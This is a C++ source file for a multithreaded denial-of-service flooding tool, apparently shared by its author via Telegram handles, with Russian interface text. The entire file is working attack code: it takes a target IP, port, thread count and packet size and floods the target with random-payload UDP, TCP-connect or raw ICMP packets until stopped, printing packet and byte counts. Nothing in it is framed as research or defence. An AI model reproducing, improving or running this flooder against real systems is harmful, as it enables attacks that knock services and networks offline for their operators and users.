#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <random>
#include <atomic>
#include <signal.h>
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#endif

std::string author = "t.me/Bengamin_Button t.me/XillenAdapter";
std::atomic<bool> running(true);
std::atomic<int> packets_sent(0);
std::atomic<int> bytes_sent(0);

void signal_handler(int signal) {
    running = false;
    std::cout << "\nОстановка атаки..." << std::endl;
}

class NetworkAttacker {
private:
    std::string target_ip;
    int target_port;
    int thread_count;
    int packet_size;
    std::mt19937 rng;
    
public:
    NetworkAttacker(const std::string& ip, int port, int threads, int psize) 
        : target_ip(ip), target_port(port), thread_count(threads), packet_size(psize), rng(std::random_device{}()) {}
    
    void generateRandomData(char* buffer, int size) {
        std::uniform_int_distribution<int> dist(0, 255);
        for (int i = 0; i < size; i++) {
            buffer[i] = static_cast<char>(dist(rng));
        }
    }
    
    void udpFlood() {
#ifdef _WIN32
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
#endif
        
        sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);
        
        char* packet_data = new char[packet_size];
        generateRandomData(packet_data, packet_size);
        
        while (running) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock < 0) continue;
            
            int result = sendto(sock, packet_data, packet_size, 0, 
                              (sockaddr*)&target_addr, sizeof(target_addr));
            if (result > 0) {
                packets_sent++;
                bytes_sent += result;
            }
            
#ifdef _WIN32
            closesocket(sock);
#else
            close(sock);
#endif
        }
        
        delete[] packet_data;
#ifdef _WIN32
        WSACleanup();
#endif
    }
    
    void tcpFlood() {
#ifdef _WIN32
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
#endif
        
        sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);
        
        while (running) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            int result = connect(sock, (sockaddr*)&target_addr, sizeof(target_addr));
            if (result == 0) {
                packets_sent++;
                bytes_sent += packet_size;
                
                char* data = new char[packet_size];
                generateRandomData(data, packet_size);
                send(sock, data, packet_size, 0);
                delete[] data;
            }
            
#ifdef _WIN32
            closesocket(sock);
#else
            close(sock);
#endif
        }
        
#ifdef _WIN32
        WSACleanup();
#endif
    }
    
    void icmpFlood() {
#ifdef _WIN32
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
#endif
        
        sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = 0;
        inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);
        
        char* icmp_packet = new char[packet_size + 8];
        icmp_packet[0] = 8;
        icmp_packet[1] = 0;
        icmp_packet[2] = 0;
        icmp_packet[3] = 0;
        icmp_packet[4] = 0;
        icmp_packet[5] = 0;
        icmp_packet[6] = 0;
        icmp_packet[7] = 0;
        generateRandomData(icmp_packet + 8, packet_size);
        
        while (running) {
            int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
            if (sock < 0) continue;
            
            int result = sendto(sock, icmp_packet, packet_size + 8, 0,
                              (sockaddr*)&target_addr, sizeof(target_addr));
            if (result > 0) {
                packets_sent++;
                bytes_sent += result;
            }
            
#ifdef _WIN32
            closesocket(sock);
#else
            close(sock);
#endif
        }
        
        delete[] icmp_packet;
#ifdef _WIN32
        WSACleanup();
#endif
    }
    
    void startAttack(const std::string& attack_type) {
        std::vector<std::thread> workers;
        
        for (int i = 0; i < thread_count; i++) {
            if (attack_type == "udp") {
                workers.emplace_back(&NetworkAttacker::udpFlood, this);
            } else if (attack_type == "tcp") {
                workers.emplace_back(&NetworkAttacker::tcpFlood, this);
            } else if (attack_type == "icmp") {
                workers.emplace_back(&NetworkAttacker::icmpFlood, this);
            }
        }
        
        for (auto& worker : workers) {
            worker.join();
        }
    }
};

void printStats() {
    while (running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        std::cout << "\rПакетов отправлено: " << packets_sent.load() 
                  << " | Байт отправлено: " << bytes_sent.load() 
                  << " | Скорость: " << (bytes_sent.load() / 1024) << " KB/s" << std::flush;
    }
}

int main(int argc, char* argv[]) {
    std::cout << author << std::endl;
    
    if (argc < 6) {
        std::cout << "Использование: " << argv[0] << " <ip> <port> <тип> <потоки> <размер_пакета> [время]" << std::endl;
        std::cout << "Типы атак: udp, tcp, icmp" << std::endl;
        return 1;
    }
    
    std::string target_ip = argv[1];
    int target_port = std::atoi(argv[2]);
    std::string attack_type = argv[3];
    int thread_count = std::atoi(argv[4]);
    int packet_size = std::atoi(argv[5]);
    int duration = (argc > 6) ? std::atoi(argv[6]) : 0;
    
    signal(SIGINT, signal_handler);
    
    std::cout << "Запуск атаки на " << target_ip << ":" << target_port << std::endl;
    std::cout << "Тип: " << attack_type << " | Потоки: " << thread_count 
              << " | Размер пакета: " << packet_size << " байт" << std::endl;
    
    NetworkAttacker attacker(target_ip, target_port, thread_count, packet_size);
    
    std::thread stats_thread(printStats);
    std::thread attack_thread(&NetworkAttacker::startAttack, &attacker, attack_type);
    
    if (duration > 0) {
        std::this_thread::sleep_for(std::chrono::seconds(duration));
        running = false;
    }
    
    attack_thread.join();
    stats_thread.join();
    
    std::cout << "\nАтака завершена." << std::endl;
    std::cout << "Итого пакетов: " << packets_sent.load() << std::endl;
    std::cout << "Итого байт: " << bytes_sent.load() << std::endl;
    
    return 0;
}